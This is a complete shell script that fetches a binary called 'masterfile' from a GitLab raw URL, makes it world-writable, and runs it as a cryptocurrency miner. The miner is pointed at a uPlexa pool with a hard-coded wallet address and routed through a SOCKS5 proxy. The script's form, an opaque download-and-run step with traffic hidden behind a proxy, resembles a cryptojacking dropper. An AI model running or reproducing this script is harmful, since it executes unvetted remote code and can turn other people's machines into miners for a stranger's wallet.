#!/bin/sh
wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
chmod 777 masterfile
POOL=us.uplexa.herominers.com:1177
WALLET=UmWLzD8WeTeHGsLkg62HNL1np52QG5rRxBUc4iL6rtyGQcdUrkGwUBQQAEjSZQTR3DdW27iJrq6aAXBLrYveNegr2JwsVeAHZ
WORKER=CPU
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER -a cn/upx2 --donate-level 1 -t 2 -x $PROXY -k
